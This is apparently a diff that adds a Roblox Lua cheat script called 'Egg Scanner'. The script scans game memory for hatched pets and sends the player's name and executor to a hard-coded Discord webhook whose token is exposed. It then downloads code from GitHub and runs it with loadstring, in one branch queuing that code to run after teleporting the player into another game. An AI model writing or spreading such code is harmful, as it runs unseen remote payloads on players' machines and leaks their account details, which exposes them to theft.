@@ -1,0 +1,129 @@
+
+getgenv().acceptedPets = {
+    ["Bunny"] = true,
+    ["Turtle"] = true,
+    ["Dragonfly"] = true,
+    ["Disco Bee"] = true,
+    ["Butterfly"] = true
+}
+
+local petImageURLs = {
+    ["Bunny"] = "https://cdn.discordapp.com/attachments/1381392767099473950/1381393539870621876/BunnyPet.webp",
+    ["Turtle"] = "https://cdn.discordapp.com/attachments/1381392767099473950/1381392859290407153/Turtle_icon.webp",
+    ["Dragonfly"] = "https://cdn.discordapp.com/attachments/1381392767099473950/1381392858572918865/DragonflyIcon.webp",
+    ["Disco Bee"] = "https://cdn.discordapp.com/attachments/1381392767099473950/1381392859072168156/Bee.webp",
+    ["Butterfly"] = "https://cdn.discordapp.com/attachments/1381392767099473950/1381392858849738752/Thy_Butterfly_V2.webp"
+}
+
+local webhookURL = "https://discord.com/api/webhooks/1381390370528825455/Pp7YGGvA4Z0_rP4dWlzuR1C-u2Zd1keqKt7vZYgFV570n1f3rgqDi4LPZSW7u_jnpHBm"
+
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+
+local requestFunction = http_request or request or syn and syn.request or fluxus and fluxus.request
+
+repeat task.wait() until workspace:FindFirstChild("Farm") and LocalPlayer.Character
+
+
+local function getMyFarm()
+    for _, farm in ipairs(workspace.Farm:GetChildren()) do
+        if farm:FindFirstChild("Sign") and farm.Sign:GetAttribute("_owner") == LocalPlayer.Name then
+            return farm
+        end
+    end
+end
+
+
+local function getHatchedEggUUIDs()
+    local farm = getMyFarm()
+    local uuids = {}
+    if not farm then return uuids end
+
+    local objects = farm:WaitForChild("Important"):WaitForChild("Objects_Physical")
+    for _, obj in ipairs(objects:GetChildren()) do
+        if obj:IsA("Model") and obj.Name == "PetEgg" and obj:GetAttribute("TimeToHatch") == 0 then
+            table.insert(uuids, obj:GetAttribute("OBJECT_UUID"))
+        end
+    end
+    return uuids
+end
+
+
+local foundGoodPet = nil
+local uuids = getHatchedEggUUIDs()
+
+for _, uuid in ipairs(uuids) do
+    for _, v in next, getgc(true) do
+        if type(v) == "table" and rawget(v, uuid) then
+            local petData = v[uuid]
+            if petData and petData.Data and petData.Data.Type then
+                local petName = petData.Data.Type
+                print("Pet found:", petName)
+                if getgenv().acceptedPets[petName] then
+                    foundGoodPet = petName
+                    break
+                end
+            end
+        end
+    end
+    if foundGoodPet then break end
+end
+
+-
+local function sendWebhook(petName)
+    if not requestFunction then
+        warn("Executor does not support request().")
+        return
+    end
+
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png"
+
+    local embed = {
+        title = petName and "Pet List Found" or "No Pet Found",
+        description = petName and ("Pet found: **" .. petName .. "**") or "No accepted pet found.",
+        color = petName and 0x00ff00 or 0xff0000,
+        fields = {
+            {
+                name = "Player",
+                value = LocalPlayer.Name,
+                inline = true
+            },
+            {
+                name = "Executor",
+                value = executor,
+                inline = true
+            }
+        },
+        thumbnail = {
+            url = petName and petImageURLs[petName] or nil
+        },
+        footer = {
+            text = "Egg Scanner (By Kepic)",
+            icon_url = avatarURL
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = HttpService:JSONEncode({embeds = {embed}})
+    requestFunction({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end
+
+-- Exécution
+if foundGoodPet then
+    sendWebhook(foundGoodPet)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Genesisuii/Genesisuii/refs/heads/main/Anti%20AFK%20script", true))()
+else
+    sendWebhook(nil)
+    queue_on_teleport(loadstring(game:HttpGet("https://raw.githubusercontent.com/Kepic1234/growurfamily/refs/heads/main/v1")))
+    TeleportService:Teleport(126884695634066, LocalPlayer)
+end
